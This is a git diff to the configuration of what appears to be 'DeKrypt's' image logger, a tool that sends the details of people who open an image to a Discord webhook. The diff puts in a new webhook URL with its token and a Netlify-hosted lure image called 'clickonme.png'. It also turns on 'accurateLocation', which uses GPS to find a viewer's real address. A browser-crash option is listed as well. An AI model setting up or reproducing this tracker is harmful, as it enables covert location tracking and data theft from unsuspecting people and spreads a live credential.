@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": https://discord.com/api/webhooks/1341352960449581066/xJmpbtjWSLmeR5RFy_4YgE0IO-gIV1msd1sGJX5bb3a3C3_iEOLRk2zKKx8-18TDgzKn
-    "image": https://upload.wikimedia.org/wikipedia/commons/e/eb/Ash_Tree_-_geograph.org.uk_-_590710.jpg # You can also have a custom image by using a URL argument
+    "webhook": https://canary.discord.com/api/webhooks/1456605635679486128/edavsDd7kL92kVdXHpUWwRBP4sYZRErHx-MYE7Nh1aOme2t3TndetpKksRTw5QOu3Mjn
+    "image": https://splendid-cascaron-dcd488.netlify.app/clickonme.png # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
